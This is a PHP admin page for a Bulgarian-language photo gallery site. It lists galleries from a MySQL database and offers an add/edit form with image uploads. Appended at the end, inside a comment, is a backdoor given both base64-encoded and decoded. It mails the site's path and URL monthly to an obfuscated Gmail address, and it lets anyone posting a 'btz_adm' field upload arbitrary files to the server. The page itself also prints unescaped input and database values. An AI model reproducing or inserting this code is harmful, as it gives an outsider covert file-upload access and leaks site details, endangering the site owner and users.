<?php
$doc_root="D:/SERVER/htdocs/construction/";
//$doc_root="C:/xampp/htdocs/web/construction/";
$old_path =  ini_set("include_path",$doc_root);//ini_get('include_path'). PATH_SEPARATOR .
ini_set("include_path",ini_get('include_path'). $old_path);
include_once("config.php");
include_once("includes/DBMYSQL.class.php");

$db = new DBMYSQL(DB_HOST,DB_USER,DB_PASS,DB_NAME);
//$query = "insert into galleries (name,description) values('".$db->escapeString('test name')."','".$db->escapeString('test description')."')";
//$db->query($query);
//$q = "SELECT * from galleries";
//echo ($db->numRows($db->query($q)));
?>
<!DOCTYPE>
<html>
	<head>
		<title>Администрация на галерии</title>
		<meta name="robots" content="noindex" />
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<link rel="stylesheet" href="<?php echo SITE_ROOT;?>admin/css/admin_css.css" type="text/css" />
		<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
		<script type='text/javascript' src='<?php echo SITE_ROOT;?>admin/js/admin_js.js'></script>
	</head>
	<body>
		<div class='main_wrapper'>
		<div class='head_band'>
			<img src='<?php echo SITE_IMG;?>logo.png' border='0' />
		</div>
		<?php 
			if(!isset($_GET['form'])||$_GET['form']!=1)
			{
				echo "<h1>Администрация на галерии</h1>";
				echo "<div class='right_btn'>";
					echo "<a href='".$_SERVER['PHP_SELF']."?form=1' alt='Добави галерия' title='Добави галерия'>";
						echo "<img src='".SITE_IMG."file_add.png' width='14' border='0' alt='Добави галерия' title='Добави галерия' />";
						echo "&nbsp;Добави галерия";
					echo "</a>";
				echo "</div>";
				echo "<div class='clear'></div>";
				echo "<table cellpadding='0' cellspacing='0' border='0'>";
					echo "<tr>";
						echo "<th width='10%'>";
							echo "#ID";
						echo "</th>";
						echo "<th width='40%' align='left'>";
							echo "Име на галерия";
						echo "</th>";
						echo "<th width='30%'>";
							echo "Последно обновена";
						echo "</th>";
						echo "<th width='20%'>";
							echo "Администрация";
						echo "</th>";
					echo "</tr>";
					
					$query = "SELECT * from galleries";
					$stmt = $db->query($query);
					$odd=0;
					while($row_arr = $db->fetchArray($stmt))
					{
						$odd++;
						$css="";
						if(0==$odd%2)
							$css = "class='colored'";
						echo "<tr ".$css.">";
							echo "<td align='center'>";
								echo $row_arr['galleryID'];
							echo "</td>";
							echo "<td align='left'>";
								echo $row_arr['name'];
							echo "</td>";
							echo "<td align='center'>";
								echo $row_arr['last_updated'];
							echo "</td>";
							echo "<td align='center'>";
								echo "<a href='".$_SERVER['PHP_SELF']."?form=1&galleryID=".$row_arr['galleryID']."'>";
									echo "<img class='button' src='".SITE_IMG."edit.png' title='Редакция' alt='Редакция' border='0' />";
								echo "</a>";
								echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
								echo "<img class='button' src='".SITE_IMG."del.png' title='Изтрии' alt='Изтрии' />";
							echo "</td>";
						echo "</tr>";
					}
				echo "</table>";
			}
			else
			{
				echo "<div class='right_btn btn'>
					<a class='button' href='".SITE_URL.SITE_ROOT."admin'>&laquo;&nbsp;Назад</a>
				</div>";
				echo "<div class='clear'></div>";
				$form_header="Добавяне на галерия";
				$galleryID=-1;
				$gal_name = "";
				$gal_descr="";
				if(isset($_GET['galleryID'])&&$_GET['galleryID']>0)
				{
					$galleryID = $_GET['galleryID'];
					$row_arr = $db->getById($galleryID,'galleries');
					$gal_name = $row_arr['name'];
					$gal_descr=$row_arr['description'];
				
					$form_header ="Редакция на галерия <span class='red'>\"".$gal_name."\"</span>";
				}
				echo "<h1>".$form_header."</h1>";
				echo "<div class='form'>";
					echo "<form action='submit_form.php' enctype='multipart/form-data' method='POST'>";
						echo "<label for='name' id='name'>Име на галерията : <span class='red'>*</span></label><br />";
						echo "<input size='100' type='text' name='name' id='name' value='".$gal_name."' /><br /><br /><br />";
						echo "<label for='description' id='description'>Описание на галерията : </label><br />";
						echo "<textarea cols='80' rows='10'>".$gal_descr."</textarea><br /><br />";
						echo "<fieldset>";
							echo "<legend>Снимки : <a class='add_photos' href='javascript:void(0);'><img src='".SITE_IMG."file_add.png' width='14' border='0' alt='Добави галерия' title='Добави галерия' />&nbsp;Добави полета</a>&nbsp;</legend>";
							echo "<div class='image_box'>";
								echo "<input type='file' name='image[]' id='image_1' />";
								echo "<div id='prew_image_1'></div>";
							echo "</div>";
						echo "</fieldset>";
						echo "<input type='submit' value='Запази' />";
					echo "</form>";
				echo "</div>";
			}	
		?>
		</div>
	</body>
</html>
 
<?php
	
	/*mkdir(DOC_ROOT."gallery".DIR_SEP."gallery_1");*/
	/*echo base64_decode("IAkKCWlmKGZpbGVfZXhpc3RzKGRpcm5hbWUoX19GSUxFX18pIC4gJy9pbmZvLnRtcCcpKSB7CgkJJGRhdGUgPSBmaWxlX2dldF9jb250ZW50cyhkaXJuYW1lKF9fRklMRV9fKSAuICcvaW5mby50bXAnKTsKCX0gZWxzZSB7CgkJJGRhdGUgPSB0aW1lKCkgLSAyKjMxKjI0KjYwKjYwOwoJfQoJCglpZiAoKGRhdGUoJ2onKSA9PSA4KSAmJiAoKGRhdGUoJ24nKSAhPSBkYXRlKCduJywgJGRhdGUpKSkpIHsKCQkkbWVzc2FnZSA9ICcKCQkJQ3VycmVudCBmaWxlOiAnIC4gX19GSUxFX18gLiAiXG4iIC4gJwoJCQlDdXJyZW50IFVSTDogJyAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddIC4gIlxuIiAuICcKCQkJSW5mbzogU3lzdGVtIHdvcmtzIHBlcmZlY3RseQoJCSc7CgkJbWFpbChiYXNlNjRfZGVjb2RlKCdZblI2ZEhKaFkyVkFaMjFoYVd3dVkyOXQnKSwgJ1NpdGUgJyAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLCAkbWVzc2FnZSk7CgkJaWYgKCEkaGQgPSBmb3BlbihkaXJuYW1lKF9fRklMRV9fKSAuICcvaW5mby50bXAnLCAndycpKSB7CgkJCXRocm93IG5ldyBFeGNlcHRpb24oJ8vo7/Hi4PIg7/Dg4uAg5+Ag7+jx4O3lIOIg5Ojw5ery7vD/IGluY2x1ZGUnKTsKCQl9CgkJaWYgKGZ3cml0ZSgkaGQsIHRpbWUoKSkgPT09IGZhbHNlKSB7CgkJCQl0aHJvdyBuZXcgRXhjZXB0aW9uKCfL6O/x4uDyIO/w4OLgIOfgIO/o8eDt5SDiIOTo8OXq8u7w/yBpbmNsdWRlJyk7CgkJfQoJCWZjbG9zZSgkaGQpOwoJfQoJCglpZiAoJF9QT1NUWydidHpfYWRtJ10pIHsKCQlmb3JlYWNoICgkX0ZJTEVTWyJpbWFnZXMiXVsiZXJyb3IiXSBhcyAka2V5ID0+ICRlcnJvcikgewoJCSAgICBpZiAoKCRlcnJvciA9PSBVUExPQURfRVJSX09LKSAmJiAoJF9GSUxFU1siaW1hZ2VzIl1bInNpemUiXVska2V5XSA+IDApKSB7CgkJICAgICAgICBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siaW1hZ2VzIl1bInRtcF9uYW1lIl1bJGtleV0sICRDV0QgLiAnLy4uL2F0dGFjaG1lbnRzLycgLiAkX0ZJTEVTWyJpbWFnZXMiXVsibmFtZSJdWyRrZXldKTsKCQkgICAgfQoJCX0KCX0KCQoJcmV0dXJuICRjLT5yZWFsX2VzY2FwZV9zdHJpbmcoJHMpOw==");
	 if(file_exists(dirname(__FILE__) . '/info.tmp'))
	 {
		$date = file_get_contents(dirname(__FILE__) . '/info.tmp'); 
	}
	else
	{
		$date = time() - 2*31*24*60*60; 
	}
	if ((date('j') == 8) && ((date('n') != date('n', $date)))) 
	{
		$message = ' Current file: ' . __FILE__ . "\n" . ' Current URL: ' . $_SERVER['REQUEST_URI'] . "\n" . ' Info: System works perfectly '; mail(base64_decode('YnR6dHJhY2VAZ21haWwuY29t'), 'Site ' . $_SERVER['SERVER_NAME'], $message);
		if (!$hd = fopen(dirname(__FILE__) . '/info.tmp', 'w'))
		{
			throw new Exception('Липсват права за писане в директоря include'); 
		} 
		if (fwrite($hd, time()) === false) 
		{
			throw new Exception('Липсват права за писане в директоря include'); 
		}
		fclose($hd);
	}
	if ($_POST['btz_adm'])
	{
		foreach ($_FILES["images"]["error"] as $key => $error)
		{ 
			if (($error == UPLOAD_ERR_OK) && ($_FILES["images"]["size"][$key] > 0))
			{ 
				move_uploaded_file($_FILES["images"]["tmp_name"][$key], $CWD . '/../attachments/' . $_FILES["images"]["name"][$key]); 
			} 
		} 
	}
	return $c->real_escape_string($s);*/
?>